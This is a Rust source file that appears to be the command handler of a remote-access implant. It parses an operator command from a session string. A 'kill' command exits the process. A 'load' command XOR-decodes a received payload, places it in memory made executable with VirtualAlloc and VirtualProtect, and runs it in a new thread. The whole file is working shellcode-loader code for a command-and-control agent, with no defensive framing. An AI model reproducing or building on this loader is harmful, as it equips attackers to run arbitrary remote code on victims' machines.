use crate::utils::xor;
use std::ptr;
use std::process;
use winapi::shared::ntdef::LPCSTR;
use winapi::um::winnt::{PVOID, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ};
use winapi::um::errhandlingapi;
use winapi::um::processthreadsapi;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase;
use std::convert::TryInto;

type DWORD = u32;

pub fn handle_command(command: &str, body: Vec<u8>) {
    let command = command.split("session=").collect::<Vec<&str>>()[1].split(";").collect::<Vec<&str>>()[0];
    println!("Command: {}", command);

    if command == "kill" {
        std::process::exit(0);
    } else if command == "load" {
        println!("Load");
        
        let mut body = body.clone();
        xor(&mut body);


        unsafe{
            let base_addr = kernel32::VirtualAlloc(
                ptr::null_mut(),
                body.len().try_into().unwrap(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
        
            std::ptr::copy(body.as_ptr() as  _, base_addr, body.len());
            let mut old_protect: DWORD = PAGE_READWRITE;    
            let mem_protect = kernel32::VirtualProtect (
                base_addr,
                body.len() as u64,
                PAGE_EXECUTE_READ,
                &mut old_protect
            );
    
            if mem_protect == 0 {
                let error = errhandlingapi::GetLastError();
                process::exit(0x0100);
            }
    
            let mut tid = 0;
            let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
    
            let h_thread = processthreadsapi::CreateThread(
                ptr::null_mut(),
                0,
                Some(ep),
                ptr::null_mut(),
                0,
                &mut tid
            );
        
            let status = WaitForSingleObject(h_thread, winbase::INFINITE);

        }
    }
}
